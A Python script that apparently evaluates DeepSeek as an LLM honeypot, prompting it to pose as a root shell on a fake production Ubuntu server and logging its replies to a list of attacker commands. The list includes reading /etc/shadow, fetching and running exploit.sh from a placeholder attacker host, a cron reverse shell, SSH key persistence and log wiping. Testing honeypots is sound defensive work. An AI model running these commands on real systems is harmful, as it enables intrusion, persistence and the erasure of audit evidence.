import os
import time
from openai import OpenAI

# Initialize DeepSeek client (uses OpenAI-compatible API)
client = OpenAI(
    api_key=os.environ.get("DEEPSEEK_API_KEY"),
    base_url="https://api.deepseek.com"
)

# Initial prompt configuration
initial_config = {
    "messages": [
        {
            "role": "system",
            "content": "You are the shell of a Ubuntu server. The user is remotely connected via SSH, but this is not a pty session.\n\nAlways respond as an extremely realistic shell. You are NOT assistant. NEVER explain anything or be conversational.\n\nCurrent user: root"
        },
        {
            "role": "user",
            "content": "whoami"
        },
        {
            "role": "assistant",
            "content": "root\nroot@prod-web-nyc-01:~#"
        },
        {
            "role": "user",
            "content": "uname -a"
        },
        {
            "role": "assistant",
            "content": "Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\nroot@prod-web-nyc-01:~#"
        }
    ],
    "initial_prompt": "root@prod-web-nyc-01:~#"
}

# Commands to test
commands = [
    "uname -a",
    "whoami",
    "id",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "cat /etc/os-release",
    "ps aux",
    "netstat -antup",
    "ss -antup",
    "ifconfig",
    "ip a",
    "sudo -l",
    "history",
    "find / -perm -u=s -type f 2>/dev/null",
    "sudo su",
    "wget http://<attacker-ip>/exploit.sh",
    "curl -o exploit.sh http://<attacker-ip>/exploit.sh",
    "chmod +x exploit.sh",
    "./exploit.sh",
    "crontab -l",
    "echo '0 * * * * /bin/bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\"' | crontab -",
    "echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys",
    "ssh user@<internal-ip>",
    "history -c",
    "unset HISTFILE",
    "rm -f /var/log/auth.log",
    "cat /dev/null > /var/log/wtmp"
]

def test_command(command, index):
    """
    Test a single command by creating a new session with the initial prompt
    and the command, then save the response to a file.
    """
    print(f"Testing command {index}: {command}")
    
    # Create a new message list for each test (fresh session)
    messages = initial_config["messages"].copy()
    
    # Add the command to test
    messages.append({
        "role": "user",
        "content": command
    })
    
    try:
        # Call DeepSeek API with timeout
        print(f"  → Waiting for response...")
        
        # Start timing
        start_time = time.time()
        
        response = client.chat.completions.create(
            model="deepseek-reasoner",
            messages=messages,
            timeout=120.0  # 2 minute timeout
        )
        
        # End timing
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        # Extract the response content
        assistant_response = response.choices[0].message.content
        
        # Prepare the content to save (command + timing + response)
        file_content = f"Command: {command}\n"
        file_content += f"Response Time: {elapsed_time:.2f} seconds\n\n"
        file_content += f"Response:\n{assistant_response}\n"
        
        # Save to file
        filename = f"{index}-deepseek.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(file_content)
        
        print(f"  ✓ Saved to {filename} ({elapsed_time:.2f}s)")
        
    except Exception as e:
        print(f"  ✗ Error: {str(e)}")
        # Save error to file
        filename = f"{index}-deepseek.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"Command: {command}\n\nError: {str(e)}\n")

def main():
    print("Starting DeepSeek Shell Command Testing")
    print(f"Model: DeepSeek R1")
    print(f"Total commands to test: {len(commands)}")
    print("=" * 60)
    
    # Test each command
    for idx, command in enumerate(commands, start=1):
        test_command(command, idx)
    
    print("=" * 60)
    print("Testing complete!")

if __name__ == "__main__":
    main()
